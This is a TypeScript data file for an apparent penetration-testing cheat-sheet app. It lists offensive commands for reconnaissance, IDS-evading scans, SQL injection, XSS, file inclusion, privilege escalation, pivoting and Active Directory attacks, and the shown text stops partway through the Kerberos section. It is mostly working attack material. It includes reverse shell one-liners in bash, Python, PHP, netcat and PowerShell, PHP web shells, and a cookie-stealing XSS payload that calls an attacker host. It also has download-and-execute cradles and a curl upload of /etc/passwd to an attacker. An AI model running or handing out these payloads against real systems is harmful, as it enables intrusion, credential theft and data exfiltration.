export interface CheatCommand {
  cmd: string;
  desc: string;
  output?: string;
}

export interface CheatSection {
  title: string;
  commands: CheatCommand[];
}

export interface CheatCategory {
  id: string;
  name: string;
  icon: string;
  description: string;
  sections: CheatSection[];
}

export const masterCheatSheet: CheatCategory[] = [
  // ═══════════════════════════════════════════════
  // 1. RECONNAISSANCE & INFORMATION GATHERING
  // ═══════════════════════════════════════════════
  {
    id: 'recon',
    name: 'Reconnaissance & OSINT',
    icon: '🔍',
    description: 'Passive and active intelligence gathering before engaging targets. The foundation of any successful operation.',
    sections: [
      {
        title: 'DNS Enumeration & Zone Transfers',
        commands: [
          { cmd: 'dig axfr @<DNS_SERVER> <DOMAIN>', desc: 'Attempt a full DNS zone transfer to map the entire external network architecture instantly' },
          { cmd: 'dig ANY <DOMAIN> +noall +answer', desc: 'Query all available DNS record types cleanly (A, AAAA, MX, TXT, NS, SOA)' },
          { cmd: 'dig +short txt <DOMAIN>', desc: 'Retrieve TXT records (Crucial for identifying SPF, DKIM, and DMARC configurations)' },
          { cmd: 'dnsrecon -d <DOMAIN> -t std', desc: 'Perform standard, automated DNS enumeration (NS, SOA, MX, SRV)' },
          { cmd: 'dnsrecon -d <DOMAIN> -t brt -D /usr/share/wordlists/dnsmap.txt', desc: 'Aggressively brute-force subdomains using a custom wordlist to bypass zone transfer restrictions' },
          { cmd: 'fierce --domain <DOMAIN>', desc: 'Automated, highly aggressive DNS reconnaissance and subdomain discovery scanner' },
        ],
      },
      {
        title: 'Subdomain Enumeration',
        commands: [
          { cmd: 'subfinder -d <DOMAIN> -o subs.txt', desc: 'Lightning-fast passive subdomain discovery utilizing dozens of public OSINT APIs' },
          { cmd: 'amass enum -d <DOMAIN> -active', desc: 'Deep, exhaustive subdomain enumeration combining scraping, APIs, and active brute-forcing' },
          { cmd: 'assetfinder --subs-only <DOMAIN>', desc: 'Rapidly discover subdomains mapped to an organization across various internet datasets' },
          { cmd: 'gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', desc: 'High-speed, multi-threaded DNS brute-forcing with Gobuster' },
          { cmd: 'ffuf -u https://FUZZ.<DOMAIN> -w wordlist.txt -mc 200', desc: 'Fuzz subdomains extremely rapidly via HTTP Host headers using FFUF' },
          { cmd: 'curl -s "https://crt.sh/?q=%25.<DOMAIN>&output=json" | jq -r ".[].name_value" | sort -u', desc: 'Extract hidden subdomains silently from Certificate Transparency (CT) logs' },
        ],
      },
      {
        title: 'WHOIS & Infrastructure Intelligence',
        commands: [
          { cmd: 'whois <DOMAIN>', desc: 'Retrieve registrar, administrative contacts, and registration dates natively' },
          { cmd: 'whois <IP>', desc: 'Identify the owning Autonomous System Number (ASN) and mapped netblock for pivoting' },
          { cmd: 'theHarvester -d <DOMAIN> -b all', desc: 'Scrape emails, employee names, subdomains, and exposed IPs comprehensively from public sources' },
          { cmd: 'shodan host <IP>', desc: 'Query Shodan to instantly identify open ports, running services, and known vulnerabilities passively' },
          { cmd: 'whatweb <URL>', desc: 'Fingerprint the exact technology stack (CMS, frameworks, servers) powering a web application' },
          { cmd: 'wafw00f <URL>', desc: 'Detect and confidently identify Web Application Firewalls (WAF) protecting the target' },
        ],
      },
      {
        title: 'Google Dorks (Advanced Search Operators)',
        commands: [
          { cmd: 'site:<DOMAIN> filetype:pdf | ext:doc | ext:xlsx', desc: 'Uncover exposed, potentially sensitive internal documents natively indexed' },
          { cmd: 'site:<DOMAIN> inurl:admin | inurl:login', desc: 'Instantly locate hidden administrative portals or employee login gateways' },
          { cmd: 'site:<DOMAIN> intitle:"index of"', desc: 'Discover severely misconfigured servers exposing raw directory listings natively' },
          { cmd: 'site:<DOMAIN> ext:sql | ext:db | ext:log | ext:env', desc: 'Find exposed database dumps, unencrypted log files, and critical environment variables' },
          { cmd: 'inurl:"/phpinfo.php" site:<DOMAIN>', desc: 'Identify exposed phpinfo pages leaking massive amounts of server configuration data' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 2. SCANNING & ENUMERATION
  // ═══════════════════════════════════════════════
  {
    id: 'scanning',
    name: 'Scanning & Enumeration',
    icon: '📡',
    description: 'Active scanning to discover hosts, ports, services, and vulnerabilities. Transforming IP addresses into detailed attack surfaces.',
    sections: [
      {
        title: 'Nmap — Host Discovery (Ping Sweeps)',
        commands: [
          { cmd: 'nmap -sn <SUBNET>/24', desc: 'Perform a fast standard ICMP ping sweep to reliably map live hosts within a target subnet' },
          { cmd: 'nmap -sn -PA21,22,25,3389 <SUBNET>/24', desc: 'TCP ACK ping sweep bypassing strict firewalls dropping standard ICMP requests' },
          { cmd: 'nmap -sn -PS22,80,443 <SUBNET>/24', desc: 'TCP SYN ping targeting common ports, highly effective for internal network mapping' },
          { cmd: 'nmap -sn -PU53,161,162 <SUBNET>/24', desc: 'UDP ping sweep targeting stateless services, useful when TCP is heavily filtered' },
          { cmd: 'nmap -Pn <TARGET>', desc: 'Disable ping check entirely; forces scanning of hosts that completely block discovery probes' },
        ],
      },
      {
        title: 'Nmap — Port Scanning & Profiling',
        commands: [
          { cmd: 'nmap -sS <TARGET>', desc: 'TCP SYN scan: The industry standard stealth scan that never completes the full 3-way handshake' },
          { cmd: 'nmap -sT <TARGET>', desc: 'TCP Connect scan: Loud and easily logged, but extremely reliable when raw sockets are restricted' },
          { cmd: 'nmap -sU --top-ports 100 <TARGET>', desc: 'UDP scan: Slow but absolutely critical for uncovering exposed DNS, SNMP, TFTP, and DHCP services' },
          { cmd: 'nmap -p- <TARGET>', desc: 'Exhaustive scan querying all 65535 TCP ports to find hidden or non-standard services' },
          { cmd: 'nmap -sV --version-intensity 9 <TARGET>', desc: 'Aggressive service version detection attempting to force banners from non-standard ports' },
          { cmd: 'nmap -O --osscan-guess <TARGET>', desc: 'Aggressive Operating System kernel fingerprinting utilizing advanced TCP/IP stack heuristics' },
          { cmd: 'nmap -sS -sV -sC -O -p- -T4 <TARGET> -oA full_scan', desc: 'The ultimate comprehensive scan: SYN, Versions, Default Scripts, OS, All Ports, Fast, Save All Formats' },
        ],
      },
      {
        title: 'Nmap — Firewall & IDS Evasion',
        commands: [
          { cmd: 'nmap -f --mtu 24 <TARGET>', desc: 'Fragment packets precisely into 24-byte chunks to bypass basic signature-based IDS engines' },
          { cmd: 'nmap -D RND:10 <TARGET>', desc: 'Generate overwhelming noise by cloaking the real scan among 10 completely random decoy IPs' },
          { cmd: 'nmap --source-port 53 <TARGET>', desc: 'Spoof the source port as DNS (53) to slip through poorly configured stateful firewalls' },
          { cmd: 'nmap -S <SPOOFED_IP> -e eth0 <TARGET>', desc: 'Manually spoof the source IP address natively (useful for mapping internal trust relationships)' },
          { cmd: 'nmap --data-length 25 <TARGET>', desc: 'Append 25 bytes of random garbage data to probe packets to evade strict payload size signatures' },
          { cmd: 'nmap -sX <TARGET>', desc: 'TCP Xmas scan: Sets FIN, PSH, and URG flags to illuminate stateful firewalls and bypass stateless filters' },
        ],
      },
      {
        title: 'Nmap — NSE (Nmap Scripting Engine)',
        commands: [
          { cmd: 'nmap --script vuln <TARGET>', desc: 'Aggressively execute all available vulnerability detection scripts natively against the target' },
          { cmd: 'nmap --script=http-enum <TARGET>', desc: 'Enumerate standard web application directories, hidden administrative portals, and exposed files' },
          { cmd: 'nmap --script=smb-vuln* -p 445 <TARGET>', desc: 'Execute all SMB vulnerability scripts natively to explicitly check for EternalBlue and MS08-067' },
          { cmd: 'nmap -p 3306 --script=mysql-info <TARGET>', desc: 'Extract MySQL server configuration information, versions, and capability flags passively' },
          { cmd: 'nmap --script=ftp-anon <TARGET>', desc: 'Instantly verify if an FTP server permits dangerous anonymous unauthenticated access' },
        ],
      },
      {
        title: 'Deep Service Enumeration',
        commands: [
          { cmd: 'enum4linux -a <TARGET>', desc: 'Exhaustive automated SMB and NetBIOS enumeration extracting users, groups, and shares natively' },
          { cmd: 'smbclient -L //<TARGET> -N', desc: 'List available SMB shares directly utilizing an unauthenticated null session' },
          { cmd: 'snmpwalk -v2c -c public <TARGET>', desc: 'Recursively walk the entire SNMP MIB tree extracting routing tables, processes, and interfaces' },
          { cmd: 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET>', desc: 'Blazing fast SNMP community string brute-forcer utilizing custom wordlists' },
          { cmd: 'ldapsearch -x -H ldap://<TARGET> -b "dc=<DOMAIN>,dc=com"', desc: 'Perform an unauthenticated LDAP directory search to extract active directory structure natively' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 3. WEB APPLICATION ATTACKS
  // ═══════════════════════════════════════════════
  {
    id: 'web',
    name: 'Web Application Attacks',
    icon: '🌐',
    description: 'Relentless web exploitation focusing on SQL injection, XSS, advanced LFI/RFI, directory busting, and logic flaws.',
    sections: [
      {
        title: 'Directory & File Discovery',
        commands: [
          { cmd: 'feroxbuster -u <URL> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt', desc: 'Blazing fast, recursive directory discovery written in Rust natively' },
          { cmd: 'gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak', desc: 'High-performance directory brute-forcing with explicitly appended extensions' },
          { cmd: 'ffuf -u <URL>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302', desc: 'Incredibly fast, flexible web fuzzer matching explicitly on specific status codes' },
          { cmd: 'wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404,403 <URL>/FUZZ', desc: 'Advanced web fuzzer explicitly filtering out annoying 404/403 responses' },
        ],
      },
      {
        title: 'SQL Injection (SQLi)',
        commands: [
          { cmd: "sqlmap -u '<URL>?id=1' --dbs --random-agent --batch", desc: 'Automated, silent database enumeration completely bypassing basic WAFs natively' },
          { cmd: "sqlmap -u '<URL>?id=1' -D <DB> -T <TABLE> --dump", desc: 'Extract and thoroughly dump all table contents automatically using Sqlmap' },
          { cmd: "sqlmap -u '<URL>?id=1' --os-shell", desc: 'Attempt to brutally escalate an injection point directly into a highly interactive OS shell' },
          { cmd: "sqlmap -r request.txt --batch --level 5 --risk 3", desc: 'Execute a deeply exhaustive SQLi test natively from a captured Burp Suite request file' },
          { cmd: "admin' OR 1=1 -- -", desc: 'Classic extremely reliable authentication bypass payload natively targeting login portals' },
          { cmd: "' UNION SELECT NULL,NULL,NULL--", desc: 'Standard Union-based payload used natively to meticulously enumerate column counts' },
        ],
      },
      {
        title: 'Cross-Site Scripting (XSS)',
        commands: [
          { cmd: '"><svg/onload=prompt(1)>', desc: 'Extremely modern, highly reliable SVG-based XSS payload completely bypassing primitive filters' },
          { cmd: 'javascript:alert(document.cookie)', desc: 'Classic cookie theft natively executed via the browser JavaScript protocol scheme' },
          { cmd: '"><script>alert(String.fromCharCode(88,83,83))</script>', desc: 'Sophisticated attribute breakout payload natively avoiding strict literal string filtering' },
          { cmd: '<img src=x onerror="fetch(\'https://<ATTACKER>/?\'+document.cookie)">', desc: 'Deadly modern blind XSS exfiltration payload natively pushing cookies to an attacker webhook' },
          { cmd: "dalfox url <URL> -b <CALLBACK_URL>", desc: 'Extremely aggressive automated XSS scanner natively leveraging blind out-of-band callbacks' },
        ],
      },
      {
        title: 'Local/Remote File Inclusion (LFI/RFI)',
        commands: [
          { cmd: '<URL>?page=../../../../etc/passwd', desc: 'Classic fundamental LFI natively targeting the Linux password file' },
          { cmd: '<URL>?page=....//....//....//etc/passwd', desc: 'Advanced LFI utilizing double-encoding cleanly to bypass primitive path traversal filters' },
          { cmd: '<URL>?page=php://filter/convert.base64-encode/resource=index.php', desc: 'Brilliant PHP wrapper exploit explicitly reading raw backend source code encoded in base64' },
          { cmd: '<URL>?page=php://input', desc: 'Lethal PHP input wrapper escalating to RCE (Requires executing PHP code within the POST body)' },
          { cmd: '<URL>?page=http://<ATTACKER>/shell.php', desc: 'Classic Remote File Inclusion natively forcing the server to fetch and execute external payloads' },
          { cmd: '<URL>?page=/var/log/apache2/access.log', desc: 'Dangerous Log Poisoning attack vector cleanly escalating local file read directly to RCE' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 4. REVERSE SHELLS
  // ═══════════════════════════════════════════════
  {
    id: 'reverse-shells',
    name: 'Reverse Shells',
    icon: '🐚',
    description: 'One-liner reverse shell payloads for every language and platform.',
    sections: [
      {
        title: 'Bash / sh',
        commands: [
          { cmd: 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1', desc: 'Classic Bash reverse shell' },
          { cmd: 'bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"', desc: 'Bash reverse shell (explicit)' },
          { cmd: 'sh -i >& /dev/tcp/<IP>/<PORT> 0>&1', desc: 'sh reverse shell' },
          { cmd: '0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196', desc: 'File descriptor bash shell' },
        ],
      },
      {
        title: 'Python',
        commands: [
          { cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<IP>\",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", desc: 'Python3 reverse shell' },
          { cmd: "python -c 'import pty;pty.spawn(\"/bin/bash\")'", desc: 'Spawn a PTY (shell upgrade)' },
        ],
      },
      {
        title: 'PHP',
        commands: [
          { cmd: "php -r '$s=fsockopen(\"<IP>\",<PORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", desc: 'PHP reverse shell one-liner' },
          { cmd: "<?php system($_GET['cmd']); ?>", desc: 'Simple PHP web shell' },
          { cmd: "<?php echo shell_exec($_GET['cmd']); ?>", desc: 'PHP web shell (echo output)' },
        ],
      },
      {
        title: 'Netcat',
        commands: [
          { cmd: 'nc -e /bin/sh <IP> <PORT>', desc: 'Netcat reverse shell (classic)' },
          { cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f', desc: 'Netcat reverse shell (no -e flag)' },
          { cmd: 'ncat <IP> <PORT> -e /bin/bash', desc: 'Ncat reverse shell' },
        ],
      },
      {
        title: 'PowerShell (Windows)',
        commands: [
          { cmd: "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('<IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}\"", desc: 'PowerShell reverse shell one-liner' },
          { cmd: "powershell IEX(New-Object Net.WebClient).downloadString('http://<IP>/shell.ps1')", desc: 'Download and execute PowerShell script' },
        ],
      },
      {
        title: 'Listeners',
        commands: [
          { cmd: 'nc -lvnp <PORT>', desc: 'Netcat listener' },
          { cmd: 'rlwrap nc -lvnp <PORT>', desc: 'Netcat listener with readline (arrow keys)' },
          { cmd: 'socat file:`tty`,raw,echo=0 TCP-L:<PORT>', desc: 'Socat fully interactive listener' },
          { cmd: 'msfconsole -q -x "use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <IP>; set LPORT <PORT>; run"', desc: 'Metasploit multi handler' },
        ],
      },
      {
        title: 'Shell Stabilization',
        commands: [
          { cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", desc: 'Step 1: Spawn PTY' },
          { cmd: 'export TERM=xterm', desc: 'Step 2: Set terminal type' },
          { cmd: 'Ctrl+Z then: stty raw -echo; fg', desc: 'Step 3: Background, raw mode, foreground' },
          { cmd: 'stty rows <ROWS> columns <COLS>', desc: 'Step 4: Fix terminal size' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 5. PASSWORD ATTACKS
  // ═══════════════════════════════════════════════
  {
    id: 'passwords',
    name: 'Password Attacks',
    icon: '🔐',
    description: 'Hash cracking, brute-forcing credentials, and credential spraying.',
    sections: [
      {
        title: 'Hash Identification & Cracking',
        commands: [
          { cmd: 'hash-identifier', desc: 'Interactive hash type identifier' },
          { cmd: 'hashid <HASH>', desc: 'Identify hash type' },
          { cmd: 'hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt', desc: 'Crack MD5 hash' },
          { cmd: 'hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt', desc: 'Crack NTLM hash' },
          { cmd: 'hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt', desc: 'Crack SHA-512 (Linux shadow)' },
          { cmd: 'hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt', desc: 'Crack bcrypt hash' },
          { cmd: 'john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt', desc: 'John the Ripper with wordlist' },
          { cmd: 'john --show hash.txt', desc: 'Show cracked passwords' },
          { cmd: 'john hash.txt --format=Raw-MD5', desc: 'JtR with specific format' },
        ],
      },
      {
        title: 'Online Brute-Force',
        commands: [
          { cmd: 'hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET> ssh', desc: 'SSH brute-force' },
          { cmd: 'hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET> ftp', desc: 'FTP brute-force' },
          { cmd: 'hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"', desc: 'HTTP POST form brute-force' },
          { cmd: 'hydra -L users.txt -P pass.txt <TARGET> smb', desc: 'SMB brute-force' },
          { cmd: 'hydra -l <USER> -P /usr/share/wordlists/rockyou.txt rdp://<TARGET>', desc: 'RDP brute-force' },
          { cmd: 'medusa -h <TARGET> -U users.txt -P pass.txt -M ssh', desc: 'Medusa SSH brute-force' },
          { cmd: 'crackmapexec smb <TARGET> -u users.txt -p pass.txt', desc: 'CrackMapExec SMB password spray' },
        ],
      },
      {
        title: 'Wordlist Generation',
        commands: [
          { cmd: 'cewl <URL> -d 3 -m 5 -w wordlist.txt', desc: 'Generate wordlist from website' },
          { cmd: 'crunch 8 12 abcdefghijklmnopqrstuvwxyz -o wordlist.txt', desc: 'Generate custom wordlist with Crunch' },
          { cmd: 'cupp -i', desc: 'Interactive profiling wordlist generator' },
          { cmd: 'hashcat --stdout -a 3 ?u?l?l?l?d?d?d?d', desc: 'Generate password candidates with mask' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 6. FILE TRANSFERS
  // ═══════════════════════════════════════════════
  {
    id: 'transfers',
    name: 'File Transfers',
    icon: '📁',
    description: 'Move files between attacker and target machines across platforms.',
    sections: [
      {
        title: 'Linux → Attacker (Download)',
        commands: [
          { cmd: 'python3 -m http.server 80', desc: 'Start Python HTTP server on attacker' },
          { cmd: 'wget http://<ATTACKER_IP>/file -O /tmp/file', desc: 'Download file with wget' },
          { cmd: 'curl http://<ATTACKER_IP>/file -o /tmp/file', desc: 'Download file with curl' },
          { cmd: 'scp <USER>@<ATTACKER_IP>:/path/file /tmp/file', desc: 'Download file via SCP' },
          { cmd: "bash -c 'cat < /dev/tcp/<ATTACKER_IP>/<PORT> > file'", desc: 'Download using /dev/tcp' },
          { cmd: 'nc -lvnp <PORT> > file  |  nc <ATTACKER_IP> <PORT> < file', desc: 'Transfer via Netcat' },
        ],
      },
      {
        title: 'Windows → Attacker (Download)',
        commands: [
          { cmd: "powershell (New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>/file','C:\\Users\\Public\\file')", desc: 'PowerShell WebClient download' },
          { cmd: 'powershell Invoke-WebRequest -Uri http://<ATTACKER_IP>/file -OutFile C:\\Users\\Public\\file', desc: 'PowerShell Invoke-WebRequest' },
          { cmd: 'certutil -urlcache -split -f http://<ATTACKER_IP>/file C:\\Users\\Public\\file', desc: 'Certutil download (LOLBin)' },
          { cmd: 'bitsadmin /transfer job /download /priority high http://<ATTACKER_IP>/file C:\\Users\\Public\\file', desc: 'BITSAdmin download' },
        ],
      },
      {
        title: 'Upload to Attacker',
        commands: [
          { cmd: 'python3 -m uploadserver', desc: 'Start Python upload server on attacker' },
          { cmd: "curl -X POST http://<ATTACKER_IP>/upload -F 'files=@/etc/passwd'", desc: 'Upload file via curl' },
          { cmd: 'scp /path/file <USER>@<ATTACKER_IP>:/tmp/', desc: 'Upload via SCP' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 7. LINUX PRIVILEGE ESCALATION
  // ═══════════════════════════════════════════════
  {
    id: 'linux-privesc',
    name: 'Linux Privilege Escalation',
    icon: '🐧',
    description: 'Enumerate and exploit misconfigurations to escalate to root.',
    sections: [
      {
        title: 'Automated Enumeration',
        commands: [
          { cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', desc: 'Run LinPEAS automatically' },
          { cmd: './linpeas.sh -a 2>&1 | tee linpeas_output.txt', desc: 'LinPEAS with full output saved' },
          { cmd: './linux-exploit-suggester.sh', desc: 'Find kernel exploits' },
        ],
      },
      {
        title: 'Manual Enumeration',
        commands: [
          { cmd: 'id', desc: 'Current user and groups' },
          { cmd: 'whoami', desc: 'Current username' },
          { cmd: 'uname -a', desc: 'Kernel version (check for kernel exploits)' },
          { cmd: 'cat /etc/os-release', desc: 'OS version information' },
          { cmd: 'cat /etc/passwd', desc: 'List all users' },
          { cmd: 'cat /etc/shadow', desc: 'Read password hashes (requires root/readable)' },
          { cmd: 'cat /etc/crontab', desc: 'System-wide cron jobs' },
          { cmd: 'crontab -l', desc: 'Current user cron jobs' },
          { cmd: 'ls -la /etc/cron*', desc: 'Browse all cron directories' },
          { cmd: 'env', desc: 'Environment variables (passwords, paths)' },
          { cmd: 'history', desc: 'Command history (credentials, flags)' },
          { cmd: 'cat ~/.bash_history', desc: 'Bash history file' },
          { cmd: 'ifconfig / ip a', desc: 'Network interfaces (pivoting)' },
          { cmd: 'netstat -tulnp / ss -tulnp', desc: 'Listening ports and connections' },
          { cmd: 'ps aux', desc: 'Running processes' },
          { cmd: 'dpkg -l / rpm -qa', desc: 'Installed packages' },
        ],
      },
      {
        title: 'SUID / SGID / Capabilities',
        commands: [
          { cmd: 'find / -perm -4000 -type f 2>/dev/null', desc: 'Find SUID binaries' },
          { cmd: 'find / -perm -2000 -type f 2>/dev/null', desc: 'Find SGID binaries' },
          { cmd: 'getcap -r / 2>/dev/null', desc: 'Find binaries with capabilities' },
          { cmd: 'Check: https://gtfobins.github.io/', desc: 'GTFOBins — SUID/sudo exploit reference' },
        ],
      },
      {
        title: 'Sudo Exploitation',
        commands: [
          { cmd: 'sudo -l', desc: 'List sudo permissions for current user' },
          { cmd: 'sudo -V', desc: 'Check sudo version (CVE-2021-3156 if < 1.9.5p2)' },
          { cmd: 'sudo <BINARY>', desc: 'Run binary as root (check GTFOBins)' },
          { cmd: 'sudo LD_PRELOAD=/tmp/evil.so <BINARY>', desc: 'LD_PRELOAD hijack (if env_keep)' },
          { cmd: 'sudo -u#-1 /bin/bash', desc: 'CVE-2019-14287 — sudo bypass (< 1.8.28)' },
        ],
      },
      {
        title: 'Writable Files & Paths',
        commands: [
          { cmd: 'find / -writable -type f 2>/dev/null', desc: 'Find world-writable files' },
          { cmd: 'find / -writable -type d 2>/dev/null', desc: 'Find world-writable directories' },
          { cmd: 'echo $PATH', desc: 'Check PATH for hijack opportunities' },
          { cmd: 'find / -name "*.conf" -writable 2>/dev/null', desc: 'Find writable config files' },
          { cmd: 'ls -la /etc/passwd', desc: 'Check if /etc/passwd is writable (add user)' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 8. WINDOWS PRIVILEGE ESCALATION
  // ═══════════════════════════════════════════════
  {
    id: 'win-privesc',
    name: 'Windows Privilege Escalation',
    icon: '🪟',
    description: 'Windows enumeration, token abuse, service exploitation, and UAC bypass.',
    sections: [
      {
        title: 'Automated Enumeration',
        commands: [
          { cmd: 'winPEASx64.exe', desc: 'Run WinPEAS for full enumeration' },
          { cmd: 'powershell IEX(New-Object Net.WebClient).downloadString("http://<IP>/PowerUp.ps1"); Invoke-AllChecks', desc: 'PowerUp automated privesc check' },
          { cmd: 'Seatbelt.exe -group=all', desc: 'Seatbelt security posture audit' },
        ],
      },
      {
        title: 'Manual Enumeration',
        commands: [
          { cmd: 'whoami /priv', desc: 'List current user privileges' },
          { cmd: 'whoami /groups', desc: 'List current user groups' },
          { cmd: 'net user', desc: 'List all local users' },
          { cmd: 'net localgroup Administrators', desc: 'List local admin group members' },
          { cmd: 'systeminfo', desc: 'System info (OS, patches, architecture)' },
          { cmd: 'wmic qfe list', desc: 'List installed patches / hotfixes' },
          { cmd: 'netstat -ano', desc: 'Network connections with PIDs' },
          { cmd: 'tasklist /SVC', desc: 'Running processes with services' },
          { cmd: 'sc queryex type= service state= all', desc: 'List all services' },
          { cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', desc: 'Check AlwaysInstallElevated' },
        ],
      },
      {
        title: 'Token Impersonation',
        commands: [
          { cmd: 'whoami /priv  # Check for SeImpersonatePrivilege', desc: 'Required privilege check' },
          { cmd: 'PrintSpoofer.exe -c "nc.exe <IP> <PORT> -e cmd.exe"', desc: 'PrintSpoofer exploit' },
          { cmd: 'JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c nc.exe <IP> <PORT> -e cmd.exe" -t *', desc: 'JuicyPotato (Server 2016/2019)' },
          { cmd: 'GodPotato.exe -cmd "nc.exe -e cmd.exe <IP> <PORT>"', desc: 'GodPotato (works on modern Windows)' },
        ],
      },
      {
        title: 'Service Exploitation',
        commands: [
          { cmd: 'sc qc <SERVICE_NAME>', desc: 'Query service configuration' },
          { cmd: 'accesschk.exe /accepteula -uwcqv <USER> <SERVICE>', desc: 'Check service permissions' },
          { cmd: 'sc config <SERVICE> binpath="C:\\Users\\Public\\rev.exe"', desc: 'Change service binary path' },
          { cmd: 'sc stop <SERVICE> && sc start <SERVICE>', desc: 'Restart service to trigger payload' },
          { cmd: 'wmic service get name,pathname | findstr /i /v "C:\\Windows"', desc: 'Find unquoted service paths' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 9. PIVOTING & PORT FORWARDING
  // ═══════════════════════════════════════════════
  {
    id: 'pivoting',
    name: 'Pivoting & Tunneling',
    icon: '🔀',
    description: 'SSH tunneling, SOCKS proxies, and lateral movement through networks.',
    sections: [
      {
        title: 'SSH Tunneling',
        commands: [
          { cmd: 'ssh -L <LOCAL_PORT>:<TARGET>:<REMOTE_PORT> <USER>@<PIVOT>', desc: 'Local port forward (access remote service via local port)' },
          { cmd: 'ssh -R <REMOTE_PORT>:localhost:<LOCAL_PORT> <USER>@<ATTACKER>', desc: 'Remote port forward (expose local service to attacker)' },
          { cmd: 'ssh -D 1080 <USER>@<PIVOT>', desc: 'Dynamic SOCKS proxy (route all traffic through pivot)' },
          { cmd: 'ssh -N -f -L <LOCAL_PORT>:<TARGET>:<REMOTE_PORT> <USER>@<PIVOT>', desc: 'Background SSH tunnel (no shell)' },
        ],
      },
      {
        title: 'Chisel',
        commands: [
          { cmd: 'chisel server -p 8080 --reverse', desc: 'Start Chisel server on attacker' },
          { cmd: 'chisel client <ATTACKER>:8080 R:socks', desc: 'Reverse SOCKS proxy from target' },
          { cmd: 'chisel client <ATTACKER>:8080 R:<LOCAL_PORT>:<TARGET>:<REMOTE_PORT>', desc: 'Reverse port forward' },
        ],
      },
      {
        title: 'Proxychains',
        commands: [
          { cmd: 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf', desc: 'Configure proxychains SOCKS5' },
          { cmd: 'proxychains nmap -sT -Pn <INTERNAL_TARGET>', desc: 'Nmap through proxy (TCP connect only)' },
          { cmd: 'proxychains curl http://<INTERNAL_TARGET>', desc: 'cURL through SOCKS proxy' },
        ],
      },
      {
        title: 'Other Techniques',
        commands: [
          { cmd: 'socat TCP-LISTEN:<LOCAL_PORT>,fork TCP:<TARGET>:<REMOTE_PORT>', desc: 'Socat port forward' },
          { cmd: 'plink.exe -ssh -L <LOCAL_PORT>:<TARGET>:<REMOTE_PORT> <USER>@<PIVOT>', desc: 'PuTTY port forward (Windows)' },
          { cmd: 'netsh interface portproxy add v4tov4 listenport=<LP> listenaddress=0.0.0.0 connectport=<RP> connectaddress=<TARGET>', desc: 'Windows netsh port forward' },
          { cmd: 'ligolo-ng', desc: 'Modern tunneling tool (agent/proxy architecture)' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 10. ACTIVE DIRECTORY
  // ═══════════════════════════════════════════════
  {
    id: 'active-directory',
    name: 'Active Directory Attacks',
    icon: '🏢',
    description: 'Domain enumeration, Kerberos attacks, lateral movement, and domain dominance.',
    sections: [
      {
        title: 'Domain Enumeration',
        commands: [
          { cmd: "Get-ADDomain", desc: 'PowerShell: Get domain info' },
          { cmd: "Get-ADUser -Filter * -Properties *", desc: 'PowerShell: List all domain users' },
          { cmd: "Get-ADGroup -Filter *", desc: 'PowerShell: List all groups' },
          { cmd: "Get-ADComputer -Filter * -Properties *", desc: 'PowerShell: List all computers' },
          { cmd: 'bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -c All -ns <DC_IP>', desc: 'BloodHound remote collection' },
          { cmd: 'SharpHound.exe -c All', desc: 'BloodHound local collection (run on target)' },
          { cmd: 'crackmapexec smb <SUBNET>/24', desc: 'Discover SMB hosts in subnet' },
        ],
      },
      {
        title: 'Kerberos Attacks',
        commands: [
          { cmd: "GetNPUsers.py <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <DC_IP>", desc: 'AS-REP Roasting (no pre-auth users)' },
